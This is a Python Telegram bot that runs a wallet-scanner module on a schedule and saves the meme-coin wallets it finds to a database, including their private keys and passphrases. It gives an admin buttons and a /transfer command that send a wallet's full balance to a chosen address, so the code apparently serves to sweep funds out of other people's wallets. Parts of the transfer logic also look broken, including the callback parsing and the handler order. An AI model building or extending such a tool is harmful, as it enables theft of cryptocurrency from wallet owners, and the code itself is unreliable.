import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackContext,
    CallbackQueryHandler
)
from wallet_scanner import MemeCoinScanner
from dotenv import load_dotenv
from prettytable import PrettyTable
import sqlalchemy as db
from apscheduler.schedulers.background import BackgroundScheduler

# Load environment variables
load_dotenv()

# Initialize scanner and database
scanner = MemeCoinScanner()
engine = db.create_engine(os.getenv('DATABASE_URL'))
metadata = db.MetaData()
wallets = db.Table('wallets', metadata,
                  db.Column('id', db.Integer, primary_key=True),
                  db.Column('coin', db.String),
                  db.Column('address', db.String),
                  db.Column('balance', db.Float),
                  db.Column('private_key', db.String),
                  db.Column('passphrase', db.String),
                  db.Column('transferred', db.Boolean, default=False),
                  db.Column('tx_hash', db.String))

metadata.create_all(engine)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Scheduler for auto scanning
scheduler = BackgroundScheduler()

async def start(update: Update, context: CallbackContext) -> None:
    keyboard = [
        [InlineKeyboardButton("🔍 Scan Wallets", callback_data='scan')],
        [InlineKeyboardButton("📊 View Found", callback_data='view_found')],
        [InlineKeyboardButton("💸 Transfer Funds", callback_data='transfer')],
        [InlineKeyboardButton("⚙️ Settings", callback_data='settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🤖 *Meme Coin Wallet Scanner Bot* 🤖\n\n"
        "I can help you scan and manage meme coin wallets!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'scan':
        await scan_wallets(query, context)
    elif query.data == 'view_found':
        await view_found_wallets(query, context)
    elif query.data == 'transfer':
        await transfer_menu(query, context)
    elif query.data.startswith('transfer_'):
        await handle_transfer(query, context)
    elif query.data == 'settings':
        await settings_menu(query, context)

async def scan_wallets(query, context):
    if str(query.from_user.id) != os.getenv('ADMIN_USER_ID'):
        await query.edit_message_text("⛔ Admin only command")
        return
    
    await query.edit_message_text("🔄 Starting wallet scan...")
    
    # Run scan in background
    scanner.run()
    
    with engine.connect() as conn:
        result = conn.execute(wallets.select()).fetchall()
        count = len(result)
    
    await query.edit_message_text(f"✅ Scan completed! Found {count} wallets.")

async def view_found_wallets(query, context):
    with engine.connect() as conn:
        result = conn.execute(wallets.select()).fetchall()
    
    if not result:
        await query.edit_message_text("ℹ️ No wallets found yet.")
        return
    
    table = PrettyTable()
    table.field_names = ["#", "Coin", "Address", "Balance"]
    table.align = "l"
    
    for idx, wallet in enumerate(result[-10:]):  # Show last 10
        table.add_row([
            idx,
            wallet.coin,
            f"{wallet.address[:6]}...{wallet.address[-4:]}",
            f"{wallet.balance:.6f}"
        ])
    
    await query.edit_message_text(
        f"<pre>{table}</pre>\n\n"
        "Use /transfer [index] [address] to send funds",
        parse_mode='HTML'
    )

async def transfer_menu(query, context):
    keyboard = []
    with engine.connect() as conn:
        coins = conn.execute(db.select(wallets.c.coin).distinct()).fetchall()
    
    for coin in coins:
        keyboard.append([InlineKeyboardButton(f"Transfer {coin[0]}", callback_data=f'transfer_{coin[0]}')])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data='back')])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "Select coin to transfer:",
        reply_markup=reply_markup
    )

async def handle_transfer(query, context):
    coin = query.data.split('_')[1]
    
    with engine.connect() as conn:
        wallets_list = conn.execute(
            wallets.select().where(wallets.c.coin == coin)
        ).fetchall()
    
    keyboard = []
    for idx, wallet in enumerate(wallets_list[:5]):  # Show first 5
        keyboard.append([
            InlineKeyboardButton(
                f"{idx}: {wallet.balance:.6f} {wallet.coin}",
                callback_data=f'confirm_transfer_{idx}_{coin}'
            )
        ])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data='transfer')])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"Select {coin} wallet to transfer:",
        reply_markup=reply_markup
    )

async def transfer_command(update: Update, context: CallbackContext):
    if str(update.effective_user.id) != os.getenv('ADMIN_USER_ID'):
        await update.message.reply_text("⛔ Admin only command")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "Usage: /transfer <wallet_index> <destination_address>\n\n"
            "Example: /transfer 0 0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
        )
        return
    
    wallet_index = int(args[0])
    destination = args[1]
    
    with engine.connect() as conn:
        wallet = conn.execute(
            wallets.select().offset(wallet_index).limit(1)
        ).fetchone()
    
    if not wallet:
        await update.message.reply_text("❌ Wallet not found")
        return
    
    # Confirm transfer
    keyboard = [
        [InlineKeyboardButton("✅ Confirm", callback_data=f"do_transfer_{wallet_index}_{destination}")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"⚠️ Confirm transfer:\n\n"
        f"Coin: {wallet.coin}\n"
        f"Amount: {wallet.balance}\n"
        f"From: {wallet.address}\n"
        f"To: {destination}",
        reply_markup=reply_markup
    )

async def perform_transfer(query, context):
    _, wallet_index, destination = query.data.split('_', 2)
    wallet_index = int(wallet_index)
    
    with engine.connect() as conn:
        wallet = conn.execute(
            wallets.select().offset(wallet_index).limit(1)
        ).fetchone()
        
        success, tx_hash = scanner.transfer_funds(
            wallet.coin,
            wallet.private_key,
            wallet.balance,
            destination
        )
        
        if success:
            conn.execute(
                wallets.update().where(wallets.c.id == wallet.id),
                {"transferred": True, "tx_hash": tx_hash}
            )
            await query.edit_message_text(
                f"✅ Transfer successful!\n\n"
                f"TX Hash: {tx_hash}\n"
                f"View on explorer: {scanner.get_explorer_url(wallet.coin, tx_hash)}"
            )
        else:
            await query.edit_message_text(f"❌ Transfer failed: {tx_hash}")

def main() -> None:
    """Start the bot."""
    application = Application.builder().token(os.getenv('TELEGRAM_BOT_TOKEN')).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("transfer", transfer_command))
    application.add_handler(CommandHandler("scan", scan_wallets))
    application.add_handler(CommandHandler("found", view_found_wallets))

    # Button handlers
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(CallbackQueryHandler(
        lambda u,c: perform_transfer(u,c), 
        pattern="^do_transfer_"))
    
    # Start scheduler
    scheduler.add_job(scanner.run, 'interval', hours=6)
    scheduler.start()
    
    # Run bot
    application.run_polling()

if __name__ == '__main__':
    main()